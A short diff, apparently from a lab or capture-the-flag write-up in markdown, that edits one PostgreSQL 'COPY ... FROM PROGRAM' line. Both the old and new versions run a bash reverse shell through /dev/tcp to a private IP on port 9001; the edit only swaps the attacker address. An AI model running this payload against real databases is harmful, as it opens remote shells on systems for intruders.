@@ -22,7 +22,7 @@ DROP TABLE IF EXISTS output;
 
 create table output (line text);
 
-copy output from program 'bash -c "bash -i >& /dev/tcp/10.10.10.14/9001 0>&1"';
+copy output from program 'bash -c "bash -i >& /dev/tcp/192.168.119.125/9001 0>&1"';
 ```
 
 ### Examine Table
